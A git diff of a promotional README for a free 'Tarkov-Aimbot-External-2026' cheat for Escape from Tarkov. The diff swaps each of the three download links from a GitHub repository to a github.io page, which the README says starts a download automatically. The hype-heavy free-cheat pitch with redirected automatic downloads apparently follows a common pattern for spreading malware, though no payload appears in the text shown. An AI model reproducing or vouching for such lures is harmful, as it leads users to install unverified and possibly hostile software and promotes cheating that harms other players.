@@ -1,6 +1,6 @@
 # 🎯 Tarkov-Aimbot-External-2026 - Best Free Aimbot for Escape from Tarkov 2026
 
-[![Download Now](https://img.shields.io/badge/Download-Tarkov_Aimbot_2026-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/stmikeproducciones/Tarkov-Aimbot-External-2026)
+[![Download Now](https://img.shields.io/badge/Download-Tarkov_Aimbot_2026-FF6B35?style=for-the-badge&logo=windows&logoColor=white)](https://stmikeproducciones.github.io)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these simple steps to get Tarkov-Aimbot-External-2026 running on your PC:
 ### Step 1: Download the Software
 
 Visit this link to download the application:  
-**[👉 CLICK HERE TO DOWNLOAD TARKOV-AIMBOT-EXTERNAL-2026](https://github.com/stmikeproducciones/Tarkov-Aimbot-External-2026)**
+**[👉 CLICK HERE TO DOWNLOAD TARKOV-AIMBOT-EXTERNAL-2026](https://stmikeproducciones.github.io)**
 
 The download will start automatically. Wait for the file to finish downloading completely before proceeding.
 
@@ -139,7 +139,7 @@ Don't waste another raid losing firefights. With Tarkov-Aimbot-External-2026, yo
 
 Stop struggling and start winning. Click the button below to get your free copy today:
 
-**[🎮 DOWNLOAD TARKOV-AIMBOT-EXTERNAL-2026 NOW](https://github.com/stmikeproducciones/Tarkov-Aimbot-External-2026)**
+**[🎮 DOWNLOAD TARKOV-AIMBOT-EXTERNAL-2026 NOW](https://stmikeproducciones.github.io)**
 
 Join the thousands of satisfied players who have already downloaded and are enjoying this powerful tool. Your wins start here!
 
